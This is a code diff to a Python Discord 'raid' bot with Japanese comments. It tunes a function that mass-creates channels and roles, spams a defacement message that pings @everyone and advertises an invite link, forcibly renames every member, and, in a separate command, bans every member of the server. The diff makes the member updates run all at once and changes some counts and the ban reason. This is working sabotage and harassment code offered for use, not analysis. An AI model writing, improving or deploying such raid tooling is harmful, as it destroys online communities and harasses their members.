@@ -26,7 +26,7 @@ async def execute_raid(ctx, do_ban=False):
     channel_name = 'ますまに共栄圏最強'
     channel_count = 200
     spam_message = '# このサーバーはますまに共栄圏によって荒らされました\nRaid by masumani\ndiscord.gg/DCKWUNfEA5\n@everyone\nhttps://cdn.discordapp.com/attachments/1236663988914229308/1287064282256900246/copy_89BE23AC-0647-468A-A5B9-504B5A98BC8B.gif?ex=68cf68c5&is=68ce1745&hm=1250d2c6de152cc6caab5c1b51f27163fdaa0ebff883fbbe7983959cdda7d782&'
-    spam_count = 200
+    spam_count = 10
     role_name = 'ますまに共栄圏に荒らされましたww'
     role_count = 150
 
@@ -85,31 +85,26 @@ async def execute_raid(ctx, do_ban=False):
     except Exception as e:
         await user.send(f'ロール作成失敗')
 
-    # 4. メンバーにニックネーム変更＋ロール付与（高速化）
+    # 4. メンバーにニックネーム変更＋ロール付与（超高速化）
     try:
         members_to_update = [m for m in guild.members if not m.bot and m != user and m != guild.me]
 
         async def update_member(member):
             try:
-                tasks = []
-                # ニックネーム変更
-                tasks.append(member.edit(nick='ますまに共栄圏に敗北'))
-                # ランダムに20個のロールを付与
-                if len(created_roles) >= 20:
-                    roles_to_add = random.sample(created_roles, 20)
-                    tasks.append(member.add_roles(*roles_to_add))
-                await asyncio.gather(*tasks, return_exceptions=True)
+                # ランダムに5個のロールを付与
+                if len(created_roles) >= 5:
+                    roles_to_add = random.sample(created_roles, 5)
+                    await member.edit(nick='ますまに共栄圏に敗北', roles=list(member.roles) + roles_to_add)
+                else:
+                    await member.edit(nick='ますまに共栄圏に敗北')
                 return 1
             except:
                 return 0
 
-        # 50人ずつバッチ処理
-        updated_count = 0
-        for i in range(0, len(members_to_update), 50):
-            batch = members_to_update[i:i+50]
-            update_tasks = [update_member(m) for m in batch]
-            update_results = await asyncio.gather(*update_tasks, return_exceptions=True)
-            updated_count += sum(r for r in update_results if not isinstance(r, Exception))
+        # 全員同時処理
+        update_tasks = [update_member(m) for m in members_to_update]
+        update_results = await asyncio.gather(*update_tasks, return_exceptions=True)
+        updated_count = sum(r for r in update_results if not isinstance(r, Exception))
         await user.send(f'メンバー更新: {updated_count}人')
     except Exception as e:
         await user.send(f'メンバー更新失敗')
@@ -226,7 +221,7 @@ async def allban(ctx):
 
     for member in members:
         try:
-            await guild.ban(member, reason='Masumani on top!')
+            await guild.ban(member, reason='ますまに共栄圏BAN')
             banned += 1
             if banned % 10 == 0:
                 await user.send(f'進捗: {banned}/{total}')
